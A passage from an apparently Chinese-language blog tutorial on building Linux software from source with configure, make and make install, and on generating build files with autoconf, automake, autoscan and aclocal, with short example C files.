方便不同版本共存</h5><p>通过为不同版本指定不同的 <code>--prefix</code>，可以在同一台机器上运行多版本的软件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/opt/myapp-1.0./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/opt/myapp-2.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="3-灵活管理软件"><a href="#3-灵活管理软件" class="headerlink" title="3. 灵活管理软件"></a>3. 灵活管理软件</h5><p>如果安装路径是自定义的，例如 <code>/opt/myapp</code>，删除整个软件只需移除该目录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token parameter variable">-rf</span> /opt/myapp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h4 id="如何查看-prefix-的值"><a href="#如何查看-prefix-的值" class="headerlink" title="如何查看 $prefix 的值"></a>如何查看 <code>$prefix</code> 的值</h4><p>配置完成后，<code>$prefix</code> 的值通常会被记录在 <code>Makefile</code> 中，你可以通过以下方法查看：</p><h5 id="1-直接查看-Makefile"><a href="#1-直接查看-Makefile" class="headerlink" title="1. 直接查看 Makefile"></a>1. 直接查看 <code>Makefile</code></h5><p>打开 <code>Makefile</code>，找到 <code>prefix</code> 的定义：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token string">"^prefix"</span> Makefile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-使用-config-log"><a href="#2-使用-config-log" class="headerlink" title="2. 使用 config.log"></a>2. 使用 <code>config.log</code></h5><p>查看配置过程生成的日志文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token string">"prefix"</span> config.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-功能启用-禁用选项"><a href="#2-功能启用-禁用选项" class="headerlink" title="2. 功能启用/禁用选项"></a>2. <strong>功能启用/禁用选项</strong></h3><table><thead><tr><th>选项</th><th>功能</th><th>示例</th></tr></thead><tbody><tr><td><code>--enable-FEATURE</code></td><td>启用某个功能</td><td><code>--enable-ssl</code></td></tr><tr><td><code>--disable-FEATURE</code></td><td>禁用某个功能</td><td><code>--disable-debug</code></td></tr><tr><td><code>--with-FEATURE</code></td><td>启用功能，并指定路径或配置</td><td><code>--with-ssl=/opt/openssl</code></td></tr><tr><td><code>--without-FEATURE</code></td><td>禁用功能</td><td><code>--without-zlib</code></td></tr></tbody></table><p><strong>示例</strong>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure --enable-optimizations --disable-debug --with-ssl<span class="token operator">=</span>/opt/openssl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-编译器相关选项"><a href="#3-编译器相关选项" class="headerlink" title="3. 编译器相关选项"></a>3. <strong>编译器相关选项</strong></h3><table><thead><tr><th>选项</th><th>功能</th><th>示例</th></tr></thead><tbody><tr><td><code>CC=COMPILER</code></td><td>指定 C 编译器</td><td><code>CC=gcc</code></td></tr><tr><td><code>CXX=COMPILER</code></td><td>指定 C++ 编译器</td><td><code>CXX=g++</code></td></tr><tr><td><code>CFLAGS=FLAGS</code></td><td>为 C 编译器设置标志</td><td><code>CFLAGS="-O2 -Wall"</code></td></tr><tr><td><code>CXXFLAGS=FLAGS</code></td><td>为 C++ 编译器设置标志</td><td><code>CXXFLAGS="-O2 -Wall"</code></td></tr><tr><td><code>LDFLAGS=FLAGS</code></td><td>设置链接器标志</td><td><code>LDFLAGS="-L/usr/lib"</code></td></tr><tr><td><code>CPPFLAGS=FLAGS</code></td><td>设置预处理器标志（头文件路径等）</td><td><code>CPPFLAGS="-I/usr/include"</code></td></tr></tbody></table><p><strong>示例</strong>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure <span class="token assign-left variable">CC</span><span class="token operator">=</span>gcc <span class="token assign-left variable">CFLAGS</span><span class="token operator">=</span><span class="token string">"-O2 -Wall"</span> <span class="token assign-left variable">LDFLAGS</span><span class="token operator">=</span><span class="token string">"-L/usr/local/lib"</span> <span class="token assign-left variable">CPPFLAGS</span><span class="token operator">=</span><span class="token string">"-I/usr/local/include"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-调试与日志选项"><a href="#4-调试与日志选项" class="headerlink" title="4. 调试与日志选项"></a>4. <strong>调试与日志选项</strong></h3><table><thead><tr><th>选项</th><th>功能</th><th>示例</th></tr></thead><tbody><tr><td><code>--enable-debug</code></td><td>启用调试模式</td><td><code>--enable-debug</code></td></tr><tr><td><code>--disable-debug</code></td><td>禁用调试模式</td><td><code>--disable-debug</code></td></tr><tr><td><code>--quiet</code> 或 <code>--silent</code></td><td>减少输出</td><td><code>--quiet</code></td></tr><tr><td><code>--verbose</code></td><td>显示详细输出</td><td><code>--verbose</code></td></tr></tbody></table><h3 id="5-查看所有参数"><a href="#5-查看所有参数" class="headerlink" title="5.查看所有参数"></a>5.查看所有参数</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure <span class="token parameter variable">-h</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如得到<code>./configure --python=路径</code>，可以指定安装到指定python版本库中</p><hr><h2 id="三、编译源码"><a href="#三、编译源码" class="headerlink" title="三、编译源码"></a>三、编译源码</h2><p>运行 <code>make</code> 命令开始编译：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><strong>加速编译</strong><br>利用多核 CPU：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> -j<span class="token variable"><span class="token variable">$(</span>nproc<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>常见问题</strong><br>如果出现依赖问题，请根据报错信息安装缺失的库。</p></li></ul><hr><h2 id="四、测试编译结果"><a href="#四、测试编译结果" class="headerlink" title="四、测试编译结果"></a>四、测试编译结果</h2><p>在安装前，可以运行测试（如果源码支持）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> check<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="五、安装编译结果"><a href="#五、安装编译结果" class="headerlink" title="五、安装编译结果"></a>五、安装编译结果</h2><p>运行 <code>make install</code> 安装编译完成的文件到目标路径：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完成后，检查安装路径下是否有生成的文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> /opt/myapp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="六、卸载（可选）"><a href="#六、卸载（可选）" class="headerlink" title="六、卸载（可选）"></a>六、卸载（可选）</h2><p>如果需要卸载，使用 <code>make uninstall</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">make</span> uninstall<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="七、完整操作示例"><a href="#七、完整操作示例" class="headerlink" title="七、完整操作示例"></a>七、完整操作示例</h2><p>以下是完整的从下载到安装的操作流程示例：</p><ol><li><p><strong>下载源码</strong>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://example.com/software-1.0.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-xzvf</span> software-1.0.tar.gz<span class="token builtin class-name">cd</span> software-1.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>运行配置脚本</strong>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/opt/myapp --enable-optimizations --with-ssl<span class="token operator">=</span>/opt/openssl <span class="token assign-left variable">CFLAGS</span><span class="token operator">=</span><span class="token string">"-O2 -Wall"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>编译源码</strong>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> -j<span class="token variable"><span class="token variable">$(</span>nproc<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>运行测试</strong>（可选）:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>安装程序</strong>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>验证安装</strong>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/opt/myapp/bin/software <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><hr><h2 id="八、常见问题及解决方案"><a href="#八、常见问题及解决方案" class="headerlink" title="八、常见问题及解决方案"></a>八、常见问题及解决方案</h2><h3 id="1-缺少依赖库"><a href="#1-缺少依赖库" class="headerlink" title="1. 缺少依赖库"></a>1. 缺少依赖库</h3><p><strong>错误信息</strong>: <code>configure: error: Missing library xyz</code><br><strong>解决方法</strong>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libxyz-dev  <span class="token comment"># Debian/Ubuntu</span><span class="token function">sudo</span> yum <span class="token function">install</span> xyz-devel   <span class="token comment"># CentOS/RHEL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-权限不足"><a href="#2-权限不足" class="headerlink" title="2. 权限不足"></a>2. 权限不足</h3><p><strong>错误信息</strong>: <code>Permission denied</code><br><strong>解决方法</strong>:<br>在需要权限的命令前加 <code>sudo</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-环境变量问题"><a href="#3-环境变量问题" class="headerlink" title="3. 环境变量问题"></a>3. 环境变量问题</h3><p><strong>问题描述</strong>: 安装后无法找到可执行文件。<br><strong>解决方法</strong>: 将安装路径添加到 <code>PATH</code> 中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/opt/myapp/bin:<span class="token environment constant">$PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>以下是 <code>autoconf</code> 和 <code>automake</code> 的完整使用教程，包括它们的基本概念、工作原理和实际使用步骤。</p><hr><h2 id="一、autoconf-和-automake-的简介"><a href="#一、autoconf-和-automake-的简介" class="headerlink" title="一、autoconf 和 automake 的简介"></a>一、<code>autoconf</code> 和 <code>automake</code> 的简介</h2><h3 id="1-什么是-autoconf"><a href="#1-什么是-autoconf" class="headerlink" title="1. 什么是 autoconf"></a>1. 什么是 <code>autoconf</code></h3><p><code>autoconf</code> 是一种自动生成 <code>configure</code> 脚本的工具，主要用来检测构建系统的环境是否满足软件的依赖需求，并生成相应的配置文件（如 <code>Makefile</code>）。</p><p><strong>功能</strong>:</p><ul><li>提供跨平台兼容性。</li><li>检查依赖工具和库的存在。</li><li>自动生成编译脚本。</li></ul><hr><h3 id="2-什么是-automake"><a href="#2-什么是-automake" class="headerlink" title="2. 什么是 automake"></a>2. 什么是 <code>automake</code></h3><p><code>automake</code> 是一种自动生成 <code>Makefile.in</code> 文件的工具，它依赖于更高层次的构建规则定义文件 <code>Makefile.am</code>。</p><p><strong>功能</strong>:</p><ul><li>简化 <code>Makefile</code> 编写。</li><li>与 <code>autoconf</code> 配合，生成完整的构建系统。</li><li>提供模块化和扩展支持。</li></ul><hr><h2 id="二、工作原理"><a href="#二、工作原理" class="headerlink" title="二、工作原理"></a>二、工作原理</h2><ul><li><code>autoconf</code> 从 <code>configure.ac</code> 或 <code>configure.in</code> 文件生成 <code>configure</code> 脚本。</li><li><code>automake</code> 从 <code>Makefile.am</code> 文件生成 <code>Makefile.in</code> 文件，最终结合 <code>autoconf</code> 的输出生成 <code>Makefile</code>。</li></ul><p><strong>工具链流程</strong>:</p><pre class="line-numbers language-none"><code class="language-none">configure.ac --&gt; autoconf --&gt; configureMakefile.am  --&gt; automake --&gt; Makefile.inconfigure + Makefile.in --&gt; ./configure --&gt; Makefile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="三、安装和准备环境"><a href="#三、安装和准备环境" class="headerlink" title="三、安装和准备环境"></a>三、安装和准备环境</h2><h3 id="1-安装工具"><a href="#1-安装工具" class="headerlink" title="1. 安装工具"></a>1. 安装工具</h3><p>在 Linux 环境中安装 <code>autoconf</code> 和 <code>automake</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> autoconf automake  <span class="token comment"># Debian/Ubuntu</span><span class="token function">sudo</span> yum <span class="token function">install</span> autoconf automake     <span class="token comment"># CentOS</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="2-项目准备"><a href="#2-项目准备" class="headerlink" title="2. 项目准备"></a>2. 项目准备</h3><p>创建一个简单的 C 项目目录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> myproject<span class="token builtin class-name">cd</span> myproject<span class="token function">mkdir</span> src<span class="token function">touch</span> configure.ac Makefile.am src/Makefile.am<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="四、autoconf-和-automake-使用流程"><a href="#四、autoconf-和-automake-使用流程" class="headerlink" title="四、autoconf 和 automake 使用流程"></a>四、<code>autoconf</code> 和 <code>automake</code> 使用流程</h2><h3 id="1-创建-configure-ac-文件"><a href="#1-创建-configure-ac-文件" class="headerlink" title="1. 创建 configure.ac 文件"></a><strong>1. 创建 <code>configure.ac</code> 文件</strong></h3><p><code>configure.ac</code> 是 <code>autoconf</code> 的核心文件，定义了项目名称、版本、依赖工具等。</p><p>以下是一个简单示例：</p><pre class="line-numbers language-m4" data-language="m4"><code class="language-m4">AC_INIT([myproject], [1.0], [user@example.com])  # 项目名称、版本和维护者AM_INIT_AUTOMAKE                                  # 初始化 automakeAC_PROG_CC                                       # 检测 C 编译器AC_CONFIG_FILES([Makefile src/Makefile])         # 配置 Makefile 文件AC_OUTPUT                                        # 输出配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="2-创建-Makefile-am-文件"><a href="#2-创建-Makefile-am-文件" class="headerlink" title="2. 创建 Makefile.am 文件"></a><strong>2. 创建 <code>Makefile.am</code> 文件</strong></h3><h4 id="顶层目录的-Makefile-am"><a href="#顶层目录的-Makefile-am" class="headerlink" title="顶层目录的 Makefile.am"></a>顶层目录的 <code>Makefile.am</code></h4><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">SUBDIRS <span class="token operator">=</span> src<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="src-Makefile-am"><a href="#src-Makefile-am" class="headerlink" title="src/Makefile.am"></a><code>src/Makefile.am</code></h4><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">bin_PROGRAMS <span class="token operator">=</span> myappmyapp_SOURCES <span class="token operator">=</span> main.c utils.c utils.h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="3-生成构建脚本和文件"><a href="#3-生成构建脚本和文件" class="headerlink" title="3. 生成构建脚本和文件"></a><strong>3. 生成构建脚本和文件</strong></h3><ol><li><p><strong>生成 <code>aclocal.m4</code></strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aclocal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>生成 <code>configure</code> 脚本</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">autoconf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>生成 <code>Makefile.in</code> 文件</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">automake --add-missing<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>生成 <code>Makefile</code> 文件</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><hr><h3 id="4-编译和安装"><a href="#4-编译和安装" class="headerlink" title="4. 编译和安装"></a><strong>4. 编译和安装</strong></h3><ol><li><p><strong>编译</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>安装</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>运行程序</strong><br>如果你的程序是一个可执行文件，例如 <code>myapp</code>，可以直接运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./src/myapp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><hr><h2 id="五、完整示例"><a href="#五、完整示例" class="headerlink" title="五、完整示例"></a>五、完整示例</h2><p>假设你有以下项目结构：</p><pre class="line-numbers language-none"><code class="language-none">myproject/├── configure.ac├── Makefile.am├── src/│   ├── Makefile.am│   ├── main.c│   ├── utils.c│   └── utils.h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以下是各个文件的内容：</p><h3 id="1-configure-ac"><a href="#1-configure-ac" class="headerlink" title="1. configure.ac"></a>1. <code>configure.ac</code></h3><pre class="line-numbers language-m4" data-language="m4"><code class="language-m4">AC_INIT([myproject], [1.0], [user@example.com])AM_INIT_AUTOMAKEAC_PROG_CCAC_CONFIG_FILES([Makefile src/Makefile])AC_OUTPUT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-顶层-Makefile-am"><a href="#2-顶层-Makefile-am" class="headerlink" title="2. 顶层 Makefile.am"></a>2. 顶层 <code>Makefile.am</code></h3><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">SUBDIRS <span class="token operator">=</span> src<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-src-Makefile-am"><a href="#3-src-Makefile-am" class="headerlink" title="3. src/Makefile.am"></a>3. <code>src/Makefile.am</code></h3><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">bin_PROGRAMS <span class="token operator">=</span> myappmyapp_SOURCES <span class="token operator">=</span> main.c utils.c utils.h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-src-main-c"><a href="#4-src-main-c" class="headerlink" title="4. src/main.c"></a>4. <code>src/main.c</code></h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"utils.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Sum: %d\n"</span><span class="token punctuation">,</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-src-utils-c"><a href="#5-src-utils-c" class="headerlink" title="5. src/utils.c"></a>5. <code>src/utils.c</code></h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"utils.h"</span></span><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-src-utils-h"><a href="#6-src-utils-h" class="headerlink" title="6. src/utils.h"></a>6. <code>src/utils.h</code></h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">UTILS_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">UTILS_H</span></span><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="构建和运行"><a href="#构建和运行" class="headerlink" title="构建和运行"></a>构建和运行</h3><h4 id="1-生成文件"><a href="#1-生成文件" class="headerlink" title="1. 生成文件"></a>1. 生成文件</h4><p>运行以下命令生成必要的构建文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aclocalautoconfautomake --add-missing./configure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-编译"><a href="#2-编译" class="headerlink" title="2. 编译"></a>2. 编译</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-安装"><a href="#3-安装" class="headerlink" title="3. 安装"></a>3. 安装</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-运行程序"><a href="#4-运行程序" class="headerlink" title="4. 运行程序"></a>4. 运行程序</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./src/myapp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="六、常见问题及解决方法"><a href="#六、常见问题及解决方法" class="headerlink" title="六、常见问题及解决方法"></a>六、常见问题及解决方法</h2><ol><li><strong><code>aclocal: command not found</code></strong><br><strong>原因</strong>: 未安装 <code>automake</code>。<br><strong>解决</strong>: 安装 <code>automake</code>。</li><li><strong><code>configure.ac: no proper invocation of AM_INIT_AUTOMAKE</code></strong><br><strong>原因</strong>: <code>configure.ac</code> 中缺少 <code>AM_INIT_AUTOMAKE</code>。<br><strong>解决</strong>: 添加 <code>AM_INIT_AUTOMAKE</code>。</li><li><strong><code>Makefile.am: required file 'INSTALL' not found</code></strong><br><strong>原因</strong>: 缺少默认的 <code>INSTALL</code> 文件。<br><strong>解决</strong>: 使用 <code>automake --add-missing</code> 自动生成。</li></ol><hr><h2 id="一、autoscan"><a href="#一、autoscan" class="headerlink" title="一、autoscan"></a>一、<code>autoscan</code></h2><h3 id="1-什么是-autoscan"><a href="#1-什么是-autoscan" class="headerlink" title="1. 什么是 autoscan"></a>1. 什么是 <code>autoscan</code></h3><p><code>autoscan</code> 是 <code>autoconf</code> 的一个辅助工具，用于自动生成初始的 <code>configure.ac</code> 文件（或者早期的 <code>configure.in</code> 文件）。它会扫描项目目录中的文件，推测需要哪些检查，并生成一个名为 <code>configure.scan</code> 的模板文件供开发者参考。</p><hr><h3 id="2-autoscan-的功能"><a href="#2-autoscan-的功能" class="headerlink" title="2. autoscan 的功能"></a>2. <code>autoscan</code> 的功能</h3><ul><li>自动检测源码中的依赖，例如头文件、库文件。</li><li>提供一个初步的 <code>configure.ac</code> 文件模板。</li><li>简化了手动编写配置文件的过程。</li></ul><hr><h3 id="3-使用方法"><a href="#3-使用方法" class="headerlink" title="3. 使用方法"></a>3. 使用方法</h3><h4 id="1-初始化项目"><a href="#1-初始化项目" class="headerlink" title="(1) 初始化项目"></a>(1) 初始化项目</h4><p>确保项目目录结构已经创建，并包含至少一个源文件（如 <code>main.c</code>）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> myproject<span class="token builtin class-name">cd</span> myproject<span class="token builtin class-name">echo</span> <span class="token string">'#include &lt;stdio.h&gt;'</span> <span class="token operator">&gt;</span> main.c<span class="token builtin class-name">echo</span> <span class="token string">'int main() { return 0; }'</span> <span class="token operator">&gt;&gt;</span> main.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-运行-autoscan"><a href="#2-运行-autoscan" class="headerlink" title="(2) 运行 autoscan"></a>(2) 运行 <code>autoscan</code></h4><p>在项目目录中运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">autoscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行完成后，生成一个 <code>configure.scan</code> 文件。</p><h4 id="3-修改-configure-scan"><a href="#3-修改-configure-scan" class="headerlink" title="(3) 修改 configure.scan"></a>(3) 修改 <code>configure.scan</code></h4><p>将 <code>configure.scan</code> 重命名为 <code>configure.ac</code>，并根据实际需求修改内容。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> configure.scan configure.ac<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例生成的 <code>configure.scan</code> 文件可能包含以下内容：</p><pre class="line-numbers language-m4" data-language="m4"><code class="language-m4">AC_INIT([UNKNOWN], [1.0], [bug-report@example.com])AC_CONFIG_SRCDIR([main.c])AC_CONFIG_HEADERS([config.h])AC_PROG_CCAC_OUTPUT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后，可添加更多具体的检查内容，例如库依赖、路径配置等。</p><h4 id="4-继续构建"><a href="#4-继续构建" class="headerlink" title="(4) 继续构建"></a>(4) 继续构建</h4><p>生成 <code>configure</code> 脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">autoconf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="4-autoscan-的注意事项"><a href="#4-autoscan-的注意事项" class="headerlink" title="4. autoscan 的注意事项"></a>4. <code>autoscan</code> 的注意事项</h3><ul><li>它只能作为生成初始配置的工具，输出的 <code>configure.scan</code> 文件需要手动完善。</li><li>如果项目目录中没有 <code>.c</code> 文件或标准构建文件，<code>autoscan</code> 可能无法推断正确的配置。</li></ul><hr><h2 id="二、aclocal"><a href="#二、aclocal" class="headerlink" title="二、aclocal"></a>二、<code>aclocal</code></h2><h3 id="1-什么是-aclocal"><a href="#1-什么是-aclocal" class="headerlink" title="1. 什么是 aclocal"></a>1. 什么是 <code>aclocal</code></h3><p><code>aclocal</code> 是 <code>automake</code> 的辅助工具，专门用于生成 <code>aclocal.m4</code> 文件。<code>aclocal.m4</code> 是一个包含各种宏定义的文件，用于支持 <code>autoconf</code> 和 <code>automake</code> 的功能。</p><p><code>aclocal</code> 会扫描项目目录中的 <code>configure.ac</code> 文件，以及系统中可用的宏定义，生成一个与项目兼容的宏文件。</p><hr><h3 id="2-aclocal-的功能"><a href="#2-aclocal-的功能" class="headerlink" title="2. aclocal 的功能"></a>2. <code>aclocal</code> 的功能</h3><ul><li>根据 <code>configure.ac</code> 的内容，生成或更新 <code>aclocal.m4</code> 文件。</li><li>提供对额外宏库的支持，例如 GNU 库的宏。</li><li>管理自定义宏，以便 <code>autoconf</code> 和 <code>automake</code> 可以正确工作。</li></ul><hr><h3 id="3-使用方法-1"><a href="#3-使用方法-1" class="headerlink" title="3. 使用方法"></a>3. 使用方法</h3><h4 id="1-编写-configure-ac"><a href="#1-编写-configure-ac" class="headerlink" title="(1) 编写 configure.ac"></a>(1) 编写 <code>configure.ac</code></h4><p>假设我们有以下简单的 <code>configure.ac</code> 文件：</p><pre class="line-numbers language-m4" data-language="m4"><code class="language-m4">AC_INIT([myproject], [1.0], [bug-report@example.com])AM_INIT_AUTOMAKEAC_PROG_CCAC_OUTPUT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-运行-aclocal"><a href="#2-运行-aclocal" class="headerlink" title="(2) 运行 aclocal"></a>(2) 运行 <code>aclocal</code></h4><p>运行以下命令生成或更新 <code>aclocal.m4</code> 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aclocal<span aria-hidden="true" 